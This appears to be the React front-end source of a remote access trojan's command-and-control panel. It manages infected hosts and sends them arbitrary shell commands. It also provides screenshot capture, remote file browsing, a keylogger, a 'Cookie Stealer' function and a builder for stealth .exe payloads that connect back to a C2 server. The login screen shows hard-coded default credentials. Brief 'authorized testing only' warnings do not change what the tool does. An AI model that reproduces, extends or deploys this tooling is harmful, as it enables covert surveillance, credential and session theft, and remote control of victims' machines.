import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { Shield, Activity, Terminal, Server, AlertTriangle, CheckCircle, XCircle, Trash2, Camera, FolderOpen, Keyboard, Cookie, Download, Settings, Eye, Menu, X as CloseIcon, Command, Zap, Lock } from 'lucide-react';
import './App.css';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [token, setToken] = useState(null);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  
  const [nodes, setNodes] = useState([]);
  const [commands, setCommands] = useState([]);
  const [logs, setLogs] = useState([]);
  const [stats, setStats] = useState({});
  const [selectedNode, setSelectedNode] = useState(null);
  const [commandInput, setCommandInput] = useState('');
  const [activeTab, setActiveTab] = useState('dashboard');
  const [sidebarOpen, setSidebarOpen] = useState(true);
  
  const [builderConfig, setBuilderConfig] = useState({
    c2_server: 'ws://localhost:8001/api/ws',
    aes_key: '',
    hide_console: true
  });
  const [buildResult, setBuildResult] = useState(null);
  const [notification, setNotification] = useState(null);

  useEffect(() => {
    const savedToken = localStorage.getItem('c2_token');
    if (savedToken) {
      setToken(savedToken);
      setIsAuthenticated(true);
    }
  }, []);

  useEffect(() => {
    if (isAuthenticated && token) {
      fetchData();
      const interval = setInterval(fetchData, 5000);
      return () => clearInterval(interval);
    }
  }, [isAuthenticated, token]);

  const fetchData = async () => {
    try {
      const headers = { Authorization: `Bearer ${token}` };
      const [nodesRes, statsRes, logsRes] = await Promise.all([
        axios.get(`${API}/nodes`, { headers }),
        axios.get(`${API}/stats`, { headers }),
        axios.get(`${API}/logs?limit=50`, { headers })
      ]);
      
      setNodes(nodesRes.data);
      setStats(statsRes.data);
      setLogs(logsRes.data);
      
      if (selectedNode) {
        const commandsRes = await axios.get(`${API}/commands?node_id=${selectedNode.id}`, { headers });
        setCommands(commandsRes.data);
      }
    } catch (err) {
      if (err.response?.status === 403) {
        handleLogout();
      }
    }
  };

  const showNotification = (message, type = 'success') => {
    setNotification({ message, type });
    setTimeout(() => setNotification(null), 4000);
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      const response = await axios.post(`${API}/auth/login`, { username, password });
      const newToken = response.data.access_token;
      setToken(newToken);
      setIsAuthenticated(true);
      localStorage.setItem('c2_token', newToken);
      setError('');
    } catch (err) {
      setError('Invalid credentials');
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    setToken(null);
    localStorage.removeItem('c2_token');
  };

  const executeCommand = async () => {
    if (!selectedNode || !commandInput.trim()) return;
    
    try {
      const headers = { Authorization: `Bearer ${token}` };
      await axios.post(`${API}/commands`, {
        node_id: selectedNode.id,
        command: commandInput
      }, { headers });
      
      setCommandInput('');
      showNotification('Command sent successfully');
      setTimeout(fetchData, 1000);
    } catch (err) {
      showNotification('Command failed', 'error');
    }
  };

  const deleteNode = async (nodeId) => {
    if (!window.confirm('⚠️ This will send kill command to the node. Continue?')) return;
    
    try {
      const headers = { Authorization: `Bearer ${token}` };
      await axios.delete(`${API}/nodes/${nodeId}`, { headers });
      setSelectedNode(null);
      showNotification('Node terminated');
      fetchData();
    } catch (err) {
      showNotification('Delete failed', 'error');
    }
  };

  const requestScreenshot = async () => {
    if (!selectedNode) return;
    try {
      const headers = { Authorization: `Bearer ${token}` };
      await axios.post(`${API}/screenshot`, { node_id: selectedNode.id }, { headers });
      showNotification('Screenshot requested - check logs');
    } catch (err) {
      showNotification('Screenshot failed', 'error');
    }
  };

  const listFiles = async () => {
    if (!selectedNode) return;
    try {
      const headers = { Authorization: `Bearer ${token}` };
      await axios.post(`${API}/files/list`, { node_id: selectedNode.id, path: null }, { headers });
      showNotification('File list requested - check logs');
    } catch (err) {
      showNotification('File list failed', 'error');
    }
  };

  const startKeylogger = async () => {
    if (!selectedNode) return;
    try {
      const headers = { Authorization: `Bearer ${token}` };
      await axios.post(`${API}/keylogger`, { node_id: selectedNode.id, action: 'start' }, { headers });
      showNotification('Keylogger started');
    } catch (err) {
      showNotification('Keylogger failed', 'error');
    }
  };

  const stopKeylogger = async () => {
    if (!selectedNode) return;
    try {
      const headers = { Authorization: `Bearer ${token}` };
      await axios.post(`${API}/keylogger`, { node_id: selectedNode.id, action: 'stop' }, { headers });
      showNotification('Keylogger stopped');
    } catch (err) {
      showNotification('Stop failed', 'error');
    }
  };

  const getKeylog = async () => {
    if (!selectedNode) return;
    try {
      const headers = { Authorization: `Bearer ${token}` };
      await axios.post(`${API}/keylogger`, { node_id: selectedNode.id, action: 'get' }, { headers });
      showNotification('Keylog requested - check logs');
    } catch (err) {
      showNotification('Get keylog failed', 'error');
    }
  };

  const stealCookies = async () => {
    if (!selectedNode) return;
    if (!window.confirm('⚠️ WARNING: This will extract browser cookies. Continue?')) return;
    try {
      const headers = { Authorization: `Bearer ${token}` };
      await axios.post(`${API}/cookies/steal/${selectedNode.id}`, {}, { headers });
      showNotification('Cookie extraction requested - check logs');
    } catch (err) {
      showNotification('Cookie steal failed', 'error');
    }
  };

  const generatePayload = async () => {
    try {
      const headers = { Authorization: `Bearer ${token}` };
      const response = await axios.post(`${API}/builder/generate`, builderConfig, { headers });
      setBuildResult(response.data);
      showNotification(`Payload generated: ${response.data.filename}`);
    } catch (err) {
      showNotification('Build failed: ' + (err.response?.data?.detail || err.message), 'error');
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 flex items-center justify-center p-4">
        <div className="absolute inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAiIGhlaWdodD0iNjAiIHZpZXdCb3g9IjAgMCA2MCA2MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxwYXRoIGQ9Ik0zNiAxOGMzLjMxNCAwIDYgMi42ODYgNiA2cy0yLjY4NiA2LTYgNi02LTIuNjg2LTYtNiAyLjY4Ni02IDYtNiIgc3Ryb2tlPSJyZ2JhKDI1NSwyNTUsMjU1LDAuMDMpIi8+PC9nPjwvc3ZnPg==')] opacity-20"></div>
        
        <div className="relative bg-slate-800/90 backdrop-blur-xl border border-purple-500/30 rounded-2xl shadow-2xl p-8 w-full max-w-md">
          <div className="absolute -top-10 left-1/2 transform -translate-x-1/2">
            <div className="bg-gradient-to-r from-purple-600 to-pink-600 p-4 rounded-full">
              <Shield className="w-12 h-12 text-white" />
            </div>
          </div>
          
          <div className="mt-8">
            <h1 className="text-3xl font-bold text-center bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent mb-2">
              C2 Command Center
            </h1>
            <p className="text-center text-slate-400 mb-1 text-sm">Advanced Framework</p>
            <div className="flex items-center justify-center gap-2 mb-6">
              <Lock className="w-3 h-3 text-red-400" />
              <p className="text-center text-red-400 text-xs font-semibold">AUTHORIZED ACCESS ONLY</p>
            </div>
          </div>
          
          <form onSubmit={handleLogin} className="space-y-5">
            <div>
              <label className="block text-sm font-medium text-slate-300 mb-2">Username</label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition"
                placeholder="Enter username"
                data-testid="username-input"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-slate-300 mb-2">Password</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition"
                placeholder="Enter password"
                data-testid="password-input"
              />
            </div>
            {error && (
              <div className="bg-red-500/10 border border-red-500/50 rounded-lg p-3 text-red-400 text-sm text-center">
                {error}
              </div>
            )}
            <button
              type="submit"
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold py-3 px-4 rounded-lg transition duration-200 transform hover:scale-105"
              data-testid="login-button"
            >
              Access System
            </button>
          </form>
          
          <div className="mt-6 text-center">
            <p className="text-xs text-slate-500">Default: admin / c2admin123</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-900 text-white flex">
      {/* Notification */}
      {notification && (
        <div className={`fixed top-4 right-4 z-50 px-6 py-3 rounded-lg shadow-lg border ${
          notification.type === 'error' 
            ? 'bg-red-500/90 border-red-400 text-white' 
            : 'bg-green-500/90 border-green-400 text-white'
        } backdrop-blur-sm animate-slide-in`}>
          {notification.message}
        </div>
      )}

      {/* Sidebar */}
      <div className={`${sidebarOpen ? 'w-64' : 'w-20'} bg-slate-800 border-r border-slate-700 transition-all duration-300 flex flex-col`}>
        <div className="p-4 border-b border-slate-700">
          <div className="flex items-center justify-between">
            {sidebarOpen && (
              <div className="flex items-center gap-2">
                <div className="bg-gradient-to-r from-purple-600 to-pink-600 p-2 rounded-lg">
                  <Shield className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 className="font-bold text-sm">C2 Framework</h2>
                  <p className="text-xs text-slate-400">Advanced</p>
                </div>
              </div>
            )}
            <button onClick={() => setSidebarOpen(!sidebarOpen)} className="text-slate-400 hover:text-white p-2">
              {sidebarOpen ? <CloseIcon className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
            </button>
          </div>
        </div>

        <nav className="flex-1 p-4 space-y-2">
          {[
            { id: 'dashboard', icon: Activity, label: 'Dashboard' },
            { id: 'nodes', icon: Server, label: 'Nodes' },
            { id: 'advanced', icon: Zap, label: 'Advanced' },
            { id: 'builder', icon: Settings, label: 'Builder' },
            { id: 'logs', icon: Terminal, label: 'Logs' }
          ].map((item) => (
            <button
              key={item.id}
              onClick={() => setActiveTab(item.id)}
              className={`w-full flex items-center gap-3 px-4 py-3 rounded-lg transition ${
                activeTab === item.id
                  ? 'bg-gradient-to-r from-purple-600 to-pink-600 text-white'
                  : 'text-slate-400 hover:text-white hover:bg-slate-700'
              }`}
              data-testid={`tab-${item.id}`}
            >
              <item.icon className="w-5 h-5" />
              {sidebarOpen && <span className="font-medium">{item.label}</span>}
            </button>
          ))}
        </nav>

        <div className="p-4 border-t border-slate-700">
          <button
            onClick={handleLogout}
            className="w-full bg-red-500/10 hover:bg-red-500/20 text-red-400 px-4 py-2 rounded-lg transition flex items-center justify-center gap-2"
            data-testid="logout-button"
          >
            <XCircle className="w-4 h-4" />
            {sidebarOpen && <span>Logout</span>}
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col">
        {/* Header */}
        <header className="bg-slate-800 border-b border-slate-700 px-6 py-4">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-2xl font-bold bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
                {activeTab.charAt(0).toUpperCase() + activeTab.slice(1)}
              </h1>
              <p className="text-sm text-slate-400 mt-1">
                {activeTab === 'dashboard' && 'System overview and statistics'}
                {activeTab === 'nodes' && 'Manage connected nodes'}
                {activeTab === 'advanced' && 'Advanced RAT features'}
                {activeTab === 'builder' && 'Generate custom payloads'}
                {activeTab === 'logs' && 'Audit trail and activity logs'}
              </p>
            </div>
            <div className="flex items-center gap-4">
              <div className="bg-slate-700/50 px-4 py-2 rounded-lg flex items-center gap-2">
                <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span className="text-sm text-slate-300">Operational</span>
              </div>
              <div className="bg-slate-700/50 px-4 py-2 rounded-lg">
                <span className="text-sm text-slate-300">{stats.online_nodes || 0} / {stats.total_nodes || 0} Online</span>
              </div>
            </div>
          </div>
        </header>

        {/* Content Area */}
        <main className="flex-1 p-6 overflow-auto">
          {activeTab === 'dashboard' && (
            <div className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                <StatCard icon={<Server />} title="Total Nodes" value={stats.total_nodes || 0} color="blue" />
                <StatCard icon={<CheckCircle />} title="Online" value={stats.online_nodes || 0} color="green" />
                <StatCard icon={<XCircle />} title="Offline" value={stats.offline_nodes || 0} color="red" />
                <StatCard icon={<Command />} title="Commands" value={stats.executed_commands || 0} color="purple" />
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                <div className="bg-slate-800 rounded-xl p-6 border border-slate-700">
                  <h3 className="text-lg font-bold mb-4 flex items-center gap-2">
                    <Activity className="w-5 h-5 text-purple-400" />
                    Recent Activity
                  </h3>
                  <div className="space-y-2 max-h-80 overflow-y-auto">
                    {logs.slice(0, 10).map((log, idx) => (
                      <div key={idx} className="flex items-start gap-3 p-3 bg-slate-700/50 rounded-lg hover:bg-slate-700 transition">
                        <AlertTriangle className="w-4 h-4 text-yellow-400 mt-0.5" />
                        <div className="flex-1 min-w-0">
                          <p className="text-sm font-medium text-white truncate">{log.action}</p>
                          {log.details && <p className="text-xs text-slate-400 truncate">{log.details}</p>}
                        </div>
                        <span className="text-xs text-slate-500 whitespace-nowrap">{new Date(log.timestamp).toLocaleTimeString()}</span>
                      </div>
                    ))}
                  </div>
                </div>

                <div className="bg-slate-800 rounded-xl p-6 border border-slate-700">
                  <h3 className="text-lg font-bold mb-4 flex items-center gap-2">
                    <Server className="w-5 h-5 text-blue-400" />
                    Active Nodes
                  </h3>
                  <div className="space-y-2 max-h-80 overflow-y-auto">
                    {nodes.filter(n => n.status === 'online').map((node) => (
                      <div key={node.id} className="flex items-center justify-between p-3 bg-slate-700/50 rounded-lg hover:bg-slate-700 transition cursor-pointer" onClick={() => { setSelectedNode(node); setActiveTab('nodes'); }}>
                        <div className="flex items-center gap-3">
                          <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                          <div>
                            <p className="font-medium text-white">{node.hostname}</p>
                            <p className="text-xs text-slate-400">{node.ip}</p>
                          </div>
                        </div>
                        <span className="text-xs text-slate-500">{node.os}</span>
                      </div>
                    ))}
                    {nodes.filter(n => n.status === 'online').length === 0 && (
                      <p className="text-center text-slate-500 py-8">No active nodes</p>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {activeTab === 'nodes' && (
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              <div className="space-y-4">
                <h2 className="text-xl font-bold mb-4">Connected Nodes</h2>
                {nodes.map((node) => (
                  <div
                    key={node.id}
                    onClick={() => setSelectedNode(node)}
                    className={`bg-slate-800 p-4 rounded-xl border cursor-pointer transition transform hover:scale-102 ${
                      selectedNode?.id === node.id ? 'border-purple-500 shadow-lg shadow-purple-500/20' : 'border-slate-700 hover:border-slate-600'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <div className={`w-3 h-3 rounded-full ${node.status === 'online' ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`}></div>
                        <span className="font-bold text-white">{node.hostname}</span>
                      </div>
                      <span className={`text-xs px-2 py-1 rounded ${node.status === 'online' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>
                        {node.status}
                      </span>
                    </div>
                    <div className="space-y-1 text-xs text-slate-400">
                      <p>OS: {node.os}</p>
                      <p>IP: {node.ip}</p>
                      <p>Last: {new Date(node.last_seen).toLocaleTimeString()}</p>
                    </div>
                  </div>
                ))}
                {nodes.length === 0 && <p className="text-center text-slate-500 py-8">No nodes</p>}
              </div>

              <div className="lg:col-span-2">
                {selectedNode ? (
                  <div className="space-y-4">
                    <div className="bg-slate-800 p-6 rounded-xl border border-slate-700">
                      <div className="flex items-center justify-between mb-6">
                        <h2 className="text-xl font-bold">Node Control Panel</h2>
                        <button onClick={() => deleteNode(selectedNode.id)} className="bg-red-500/10 hover:bg-red-500/20 text-red-400 px-4 py-2 rounded-lg text-sm flex items-center gap-2 transition">
                          <Trash2 className="w-4 h-4" />
                          Kill Node
                        </button>
                      </div>
                      
                      <div className="grid grid-cols-3 gap-4 mb-6">
                        <InfoBox label="Hostname" value={selectedNode.hostname} />
                        <InfoBox label="Status" value={selectedNode.status} />
                        <InfoBox label="OS" value={selectedNode.os} />
                        <InfoBox label="IP Address" value={selectedNode.ip} />
                        <InfoBox label="Node ID" value={selectedNode.id.substring(0, 8)} />
                        <InfoBox label="Created" value={new Date(selectedNode.created_at).toLocaleDateString()} />
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-slate-300 mb-2">Execute Command</label>
                        <div className="flex gap-2">
                          <input
                            type="text"
                            value={commandInput}
                            onChange={(e) => setCommandInput(e.target.value)}
                            onKeyPress={(e) => e.key === 'Enter' && executeCommand()}
                            placeholder="Enter command..."
                            className="flex-1 px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                            data-testid="command-input"
                          />
                          <button onClick={executeCommand} className="bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 px-6 py-3 rounded-lg font-medium transition">
                            Execute
                          </button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-slate-800 p-6 rounded-xl border border-slate-700">
                      <h3 className="text-lg font-bold mb-4">Command History</h3>
                      <div className="space-y-2 max-h-96 overflow-y-auto">
                        {commands.map((cmd) => (
                          <div key={cmd.id} className="bg-slate-700/50 p-3 rounded-lg">
                            <div className="flex items-center justify-between mb-2">
                              <code className="text-sm text-green-400">$ {cmd.command}</code>
                              <span className={`text-xs px-2 py-1 rounded ${
                                cmd.status === 'executed' ? 'bg-green-900/50 text-green-300' :
                                cmd.status === 'pending' ? 'bg-yellow-900/50 text-yellow-300' :
                                'bg-red-900/50 text-red-300'
                              }`}>
                                {cmd.status}
                              </span>
                            </div>
                            {cmd.result && (
                              <pre className="text-xs text-slate-300 bg-slate-900 p-2 rounded mt-2 overflow-x-auto">
                                {cmd.result}
                              </pre>
                            )}
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="bg-slate-800 p-12 rounded-xl border border-slate-700 text-center">
                    <Server className="w-16 h-16 mx-auto mb-4 text-slate-600" />
                    <p className="text-slate-400">Select a node to view details</p>
                  </div>
                )}
              </div>
            </div>
          )}

          {activeTab === 'advanced' && (
            <div className="space-y-6">
              {!selectedNode ? (
                <div className="bg-slate-800 p-12 rounded-xl border border-slate-700 text-center">
                  <AlertTriangle className="w-16 h-16 mx-auto mb-4 text-yellow-500" />
                  <p className="text-slate-400">Select a node from the Nodes tab first</p>
                </div>
              ) : (
                <>
                  <div className="bg-red-900/20 border border-red-700/50 rounded-xl p-4">
                    <div className="flex items-start gap-3">
                      <AlertTriangle className="w-5 h-5 text-red-400 mt-0.5" />
                      <div>
                        <p className="font-bold text-red-300 mb-1">WARNING: Advanced Features</p>
                        <p className="text-sm text-red-200">These are intrusive capabilities. Use only in authorized environments with explicit permission.</p>
                      </div>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <FeatureCard
                      icon={<Camera className="w-6 h-6" />}
                      title="Screenshot Capture"
                      description="Capture remote desktop screenshot"
                      color="blue"
                      onClick={requestScreenshot}
                    />
                    <FeatureCard
                      icon={<FolderOpen className="w-6 h-6" />}
                      title="File Browser"
                      description="Browse remote file system"
                      color="green"
                      onClick={listFiles}
                    />
                    <FeatureCard
                      icon={<Keyboard className="w-6 h-6" />}
                      title="Keylogger"
                      description="Capture keyboard input"
                      color="purple"
                      actions={
                        <div className="space-y-2">
                          <button onClick={startKeylogger} className="w-full bg-purple-600 hover:bg-purple-700 px-4 py-2 rounded-lg text-sm transition">Start</button>
                          <button onClick={stopKeylogger} className="w-full bg-slate-600 hover:bg-slate-700 px-4 py-2 rounded-lg text-sm transition">Stop</button>
                          <button onClick={getKeylog} className="w-full bg-yellow-600 hover:bg-yellow-700 px-4 py-2 rounded-lg text-sm transition">Get Data</button>
                        </div>
                      }
                    />
                    <FeatureCard
                      icon={<Cookie className="w-6 h-6" />}
                      title="Cookie Stealer"
                      description="Extract browser cookies"
                      color="orange"
                      onClick={stealCookies}
                    />
                  </div>
                </>
              )}
            </div>
          )}

          {activeTab === 'builder' && (
            <div className="max-w-3xl mx-auto space-y-6">
              <div className="bg-red-900/20 border border-red-700/50 rounded-xl p-4">
                <p className="text-sm text-red-200">⚠️ Generated payloads are for authorized testing only.</p>
              </div>

              <div className="bg-slate-800 p-6 rounded-xl border border-slate-700">
                <h2 className="text-2xl font-bold mb-6 flex items-center gap-2">
                  <Settings className="w-6 h-6 text-purple-400" />
                  Payload Builder
                </h2>

                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">C2 Server URL</label>
                    <input
                      type="text"
                      value={builderConfig.c2_server}
                      onChange={(e) => setBuilderConfig({...builderConfig, c2_server: e.target.value})}
                      className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                      placeholder="ws://your-server:8001/api/ws"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">AES Key (Base64)</label>
                    <input
                      type="text"
                      value={builderConfig.aes_key}
                      onChange={(e) => setBuilderConfig({...builderConfig, aes_key: e.target.value})}
                      className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                      placeholder="Enter AES key"
                    />
                  </div>

                  <div className="flex items-center gap-2">
                    <input
                      type="checkbox"
                      id="hide-console"
                      checked={builderConfig.hide_console}
                      onChange={(e) => setBuilderConfig({...builderConfig, hide_console: e.target.checked})}
                      className="w-4 h-4"
                    />
                    <label htmlFor="hide-console" className="text-sm text-slate-300">Hide Console Window (stealth mode)</label>
                  </div>

                  <button
                    onClick={generatePayload}
                    className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 px-6 py-4 rounded-lg font-bold transition flex items-center justify-center gap-2"
                  >
                    <Download className="w-5 h-5" />
                    Generate Payload (.exe)
                  </button>

                  {buildResult && (
                    <div className="mt-4 p-4 bg-green-900/20 border border-green-700/50 rounded-lg">
                      <p className="text-sm text-green-300">✓ Success! {buildResult.filename}</p>
                      <p className="text-xs text-green-400 mt-2">Path: {buildResult.path}</p>
                    </div>
                  )}
                </div>
              </div>

              <div className="bg-slate-800 p-6 rounded-xl border border-slate-700">
                <h3 className="text-lg font-bold mb-4">Features Included</h3>
                <div className="grid grid-cols-2 gap-3">
                  {['Remote Command Execution', 'Screenshot Capture', 'File Browser', 'Keylogger', 'Cookie Stealer', 'AES-256 Encryption'].map((feature, idx) => (
                    <div key={idx} className="flex items-center gap-2 text-sm text-slate-300">
                      <CheckCircle className="w-4 h-4 text-green-500" />
                      {feature}
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {activeTab === 'logs' && (
            <div className="bg-slate-800 rounded-xl p-6 border border-slate-700">
              <h2 className="text-xl font-bold mb-4">Audit Logs</h2>
              <div className="space-y-2">
                {logs.map((log, idx) => (
                  <div key={idx} className="flex items-start gap-3 p-4 bg-slate-700/50 rounded-lg hover:bg-slate-700 transition">
                    <AlertTriangle className="w-4 h-4 text-yellow-400 mt-0.5" />
                    <div className="flex-1">
                      <p className="font-medium text-white">{log.action}</p>
                      {log.details && <p className="text-sm text-slate-400">{log.details}</p>}
                      {log.user && <p className="text-xs text-slate-500 mt-1">User: {log.user}</p>}
                    </div>
                    <span className="text-xs text-slate-500 whitespace-nowrap">{new Date(log.timestamp).toLocaleString()}</span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </main>
      </div>
    </div>
  );
}

function StatCard({ icon, title, value, color }) {
  const colors = {
    blue: 'from-blue-600 to-blue-700',
    green: 'from-green-600 to-green-700',
    red: 'from-red-600 to-red-700',
    purple: 'from-purple-600 to-purple-700',
  };

  return (
    <div className={`bg-gradient-to-br ${colors[color]} rounded-xl p-6 shadow-lg transform hover:scale-105 transition`}>
      <div className="flex items-center justify-between">
        <div>
          <p className="text-sm text-white/80 mb-1">{title}</p>
          <p className="text-3xl font-bold text-white">{value}</p>
        </div>
        <div className="text-white/80">{icon}</div>
      </div>
    </div>
  );
}

function InfoBox({ label, value }) {
  return (
    <div className="bg-slate-700/50 p-3 rounded-lg">
      <p className="text-xs text-slate-400 mb-1">{label}</p>
      <p className="text-sm font-medium text-white truncate">{value}</p>
    </div>
  );
}

function FeatureCard({ icon, title, description, color, onClick, actions }) {
  const colors = {
    blue: 'from-blue-600 to-blue-700',
    green: 'from-green-600 to-green-700',
    purple: 'from-purple-600 to-purple-700',
    orange: 'from-orange-600 to-orange-700',
  };

  return (
    <div className="bg-slate-800 p-6 rounded-xl border border-slate-700 hover:border-slate-600 transition">
      <div className={`inline-flex p-3 rounded-lg bg-gradient-to-br ${colors[color]} mb-4`}>
        {icon}
      </div>
      <h3 className="text-lg font-bold mb-2">{title}</h3>
      <p className="text-sm text-slate-400 mb-4">{description}</p>
      {actions || (
        <button
          onClick={onClick}
          className={`w-full bg-gradient-to-r ${colors[color]} hover:opacity-90 px-4 py-2 rounded-lg transition`}
        >
          Activate
        </button>
      )}
    </div>
  );
}

export default App;
